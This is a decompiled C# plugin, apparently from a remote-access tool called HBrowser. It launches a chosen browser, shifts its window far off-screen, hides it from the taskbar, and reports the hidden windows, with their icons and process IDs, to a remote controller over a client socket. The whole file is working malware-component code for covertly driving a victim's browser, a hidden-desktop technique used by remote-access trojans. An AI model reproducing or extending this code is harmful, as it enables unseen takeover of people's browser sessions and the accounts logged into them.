// HBrowser, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Plugin.Handle.GetWindowsHidden
using HBrowser;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class GetWindowsHidden
{
	private class User32
	{
		public struct RECT
		{
			public int left;

			public int top;

			public int right;

			public int bottom;
		}

		public const int SW_HIDE = 0;

		public const int SW_SHOW = 5;

		public const int GWL_EXSTYLE = -20;

		public const int WS_EX_TOOLWINDOW = 128;

		public const int CloseHandel = 16;

		public const int IsCloseHandel = 20;

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);

		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool IsWindowVisible(IntPtr hWnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		[DllImport("User32.dll")]
		public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

		[DllImport("user32.dll")]
		public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
	}

	public static List<IntPtr> ListBrowser = new List<IntPtr>();

	private static readonly object SyncLock = new object();

	private static bool IsWindowActived { get; set; }

	public static void GetListWindow()
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (ListBrowser.Count <= 0)
		{
			return;
		}
		try
		{
			for (int i = ListBrowser.Count - 1; i > -1; i += -1)
			{
				lock (SyncLock)
				{
					IntPtr hWnd = ListBrowser[i];
					if (WindowCheck(hWnd))
					{
						Native.GetWindowThreadProcessId(hWnd, out var processId);
						if (processId == 0)
						{
							continue;
						}
						string mainModuleFilepath = Native.GetMainModuleFilepath(processId);
						if (File.Exists(mainModuleFilepath))
						{
							Icon original = Icon.ExtractAssociatedIcon(mainModuleFilepath);
							Icon icon = new Icon(original, new Size(24, 24));
							Bitmap bitmap = new Bitmap(icon.ToBitmap(), new Size(24, 24));
							MemoryStream memoryStream = new MemoryStream();
							bitmap.Save(memoryStream, ImageFormat.Png);
							stringBuilder.Append(mainModuleFilepath + "-==>" + i + "-==>" + Convert.ToBase64String(memoryStream.ToArray()) + "-==>" + processId + "-==>");
						}
						continue;
					}
					ListBrowser.RemoveAt(i);
				}
			}

            ClientSocket.Send("WindowsActive" + Settings.SPL + Settings.IDD + Settings.SPL + stringBuilder.ToString());
			Helper.MsgLogs("Windows list updated successfully");
		}
		catch
		{
            Helper.MsgLogs("An error occurred while importing the list of windows");
		}
	}

	public static bool InitializingWindow(int IndexWindow, int Width, int Height)
	{
		if (ListBrowser.Count > 0)
		{
			try
			{
                Helper.MsgLogs("Initializing window...");
				IntPtr intPtr = ListBrowser[IndexWindow];
				foreach (IntPtr item in ListBrowser)
				{
					MoveWindow(item, 5000, 5000, Width, Height);
				}
				if (WindowCheck(intPtr))
				{
					MoveWindow(intPtr, 10000, 10000, Width, Height);
					User32.ShowWindow(intPtr, 0);
					User32.SetWindowLong(intPtr, -20, User32.GetWindowLong(intPtr, -20) | 0x80);
					User32.ShowWindow(intPtr, 5);
					User32.SetWindowPos(intPtr, (IntPtr)1, 10000, 10000, Width, Height, 64u);
					IsWindowActived = true;
				}
				else
				{
					IsWindowActived = false;
				}
			}
			catch
			{
				return false;
			}
		}
		return IsWindowActived;
	}

	public static bool GetHandleBrowser(string Title, int Width, int Height)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (!string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(Title))
				{
					IntPtr mainWindowHandle = process.MainWindowHandle;
					MoveWindow(mainWindowHandle, 10000, 10000, Width, Height);
					User32.ShowWindow(mainWindowHandle, 0);
					User32.SetWindowLong(mainWindowHandle, -20, User32.GetWindowLong(mainWindowHandle, -20) | 0x80);
					User32.ShowWindow(mainWindowHandle, 5);
					User32.SetWindowPos(mainWindowHandle, (IntPtr)1, 10000, 10000, Width, Height, 64u);
					ListBrowser.Add(mainWindowHandle);
					return true;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static string RetrunBrowser(string Browser, string CustomName, string TitleCustomOpen)
	{
		switch (Browser)
		{
			case "chrome":
				{
					string text4 = "Welcome Chrome Browser";
					try
					{
						int num5 = 0;
						if (!ScanWindows(text4))
						{
							Process.Start("chrome", "--new-window \"data:text/html,<title>Welcome Chrome Browser</title>\" --mute-audio --disable-audio");
							while (ClientSocket.isConnected)
							{
								Process[] processes5 = Process.GetProcesses();
								Process[] array5 = processes5;
								foreach (Process process5 in array5)
								{
									if (!string.IsNullOrEmpty(process5.MainWindowTitle) && process5.MainWindowTitle.Contains(text4))
									{
										return text4;
									}
									if (num5 >= 20)
									{
										return null;
									}
								}
								Thread.Sleep(250);
								num5++;
							}
							break;
						}
						return text4;
					}
					catch
					{
						return null;
					}
				}
			case "edge":
				{
					string text3 = "Welcome Edge Browser";
					try
					{
						int num4 = 0;
						if (!ScanWindows(text3))
						{
							Process.Start("msedge", "--new-window \"data:text/html,<title>Welcome Edge Browser</title>\" --mute-audio --disable-audio");
							while (ClientSocket.isConnected)
							{
								Process[] processes4 = Process.GetProcesses();
								Process[] array4 = processes4;
								foreach (Process process4 in array4)
								{
									if (!string.IsNullOrEmpty(process4.MainWindowTitle) && process4.MainWindowTitle.Contains(text3))
									{
										return text3;
									}
									if (num4 >= 20)
									{
										return null;
									}
								}
								Thread.Sleep(250);
								num4++;
							}
							break;
						}
						return text3;
					}
					catch
					{
						return null;
					}
				}
			case "firefox":
				{
					string text2 = "Welcome_firefox_Browser";
					try
					{
						int num3 = 0;
						if (!ScanWindows(text2))
						{
							Process.Start("firefox", "--new-window data:text/html,<title>Welcome_firefox_Browser</title>");
							while (ClientSocket.isConnected)
							{
								Process[] processes3 = Process.GetProcesses();
								Process[] array3 = processes3;
								foreach (Process process3 in array3)
								{
									if (!string.IsNullOrEmpty(process3.MainWindowTitle) && process3.MainWindowTitle.Contains(text2))
									{
										return text2;
									}
									if (num3 >= 20)
									{
										return null;
									}
								}
								Thread.Sleep(250);
								num3++;
							}
							break;
						}
						return text2;
					}
					catch
					{
						return null;
					}
				}
			case "brave":
				{
					string text = "Welcome brave Browser";
					try
					{
						int num2 = 0;
						if (!ScanWindows(text))
						{
							Process.Start("brave", "--new-window \"data:text/html,<title>Welcome brave Browser</title>\" --mute-audio --disable-audio");
							while (ClientSocket.isConnected)
							{
								Process[] processes2 = Process.GetProcesses();
								Process[] array2 = processes2;
								foreach (Process process2 in array2)
								{
									if (!string.IsNullOrEmpty(process2.MainWindowTitle) && process2.MainWindowTitle.Contains(text))
									{
										return text;
									}
									if (num2 >= 20)
									{
										return null;
									}
								}
								Thread.Sleep(250);
								num2++;
							}
							break;
						}
						return text;
					}
					catch
					{
						return null;
					}
				}
			case "CustomOpen":
				try
				{
					int num = 0;
					if (!ScanWindows(TitleCustomOpen))
					{
						Process.Start(CustomName, "--new-window \"data:text/html,<title>%Title%</title>\" --mute-audio --disable-audio".Replace("%Title%", TitleCustomOpen));
						while (ClientSocket.isConnected)
						{
							Process[] processes = Process.GetProcesses();
							Process[] array = processes;
							foreach (Process process in array)
							{
								if (!string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(TitleCustomOpen))
								{
									return TitleCustomOpen;
								}
								if (num >= 20)
								{
									return null;
								}
							}
							Thread.Sleep(250);
							num++;
						}
						break;
					}
					return TitleCustomOpen;
				}
				catch
				{
					return null;
				}
		}
		return null;
	}

	public static bool ScanWindows(string Title)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (!string.IsNullOrEmpty(process.MainWindowTitle) && process.MainWindowTitle.Contains(Title))
				{
					return true;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void MoveWindow(IntPtr intPtr, int LX, int LY, int Width, int Height)
	{
		try
		{
			Native.SetWindowPos(intPtr, IntPtr.Zero, LX, LY, Width, Height, Native.SetWindowPosFlags.DoNotChangeOwnerZOrder | Native.SetWindowPosFlags.IgnoreResize);
		}
		catch
		{
		}
	}

	public static void ResizeWondow(IntPtr hWnd, int x, int y)
	{
		try
		{
			User32.SetWindowPos(hWnd, (IntPtr)1, 10000, 10000, x, y, 64u);
		}
		catch
		{
		}
	}

	public static bool WindowCheck(IntPtr hWnd)
	{
		if (!User32.IsWindowVisible(hWnd))
		{
			return false;
		}
		return true;
	}

	public static void WindowClose(IntPtr hWnd, int x, int y)
	{
		try
		{
			MoveWindow(hWnd, 10000, 10000, x, y);
			User32.PostMessage(hWnd, 16u, IntPtr.Zero, IntPtr.Zero);
			GetListWindow();
		}
		catch
		{
		}
	}

	public static void ClearList(int x, int y)
	{
		try
		{
			if (ListBrowser.Count <= 0)
			{
				return;
			}
			foreach (IntPtr item in ListBrowser)
			{
				WindowClose(item, x, y);
			}
			Helper.WindowrActive = IntPtr.Zero;
		}
		catch
		{
		}
	}
}
